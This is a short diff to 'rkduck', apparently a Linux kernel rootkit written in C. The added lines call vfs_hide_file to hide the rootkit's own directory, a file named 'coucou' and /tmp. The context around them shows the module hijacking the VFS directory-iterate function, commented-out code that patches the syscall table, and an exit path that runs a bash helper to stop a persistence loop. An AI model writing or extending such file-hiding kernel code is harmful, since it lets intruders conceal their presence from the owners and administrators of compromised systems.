@@ -1,6 +1,7 @@
 #include "duck.h"
 
 ptr_t* sys_call_table = NULL;
+struct hidden_file h_file;
 
 int duck_init(void) {
     dbg("rkduck: loaded\n");
@@ -14,6 +15,10 @@ int duck_init(void) {
     // set_page_rw((ptr_t) sys_call_table);
     // original_write = xchg(&sys_call_table[__NR_write], duck_write);
     // set_page_ro((ptr_t) sys_call_table);
+
+    vfs_hide_file("/root/rkduck/rkduck/rkduck_dir");
+    vfs_hide_file("/root/rkduck/rkduck/coucou");
+    vfs_hide_file(str_remove_duplicates("/tmp"));
 
     vfs_original_iterate = vfs_get_iterate("/");
     vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
@@ -30,6 +35,8 @@ void duck_exit(void) {
     char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
     char *envp[] = { "HOME=/", NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
+    // kfree(h_file.path);
 
     vfs_hijack_stop(vfs_original_iterate);
     
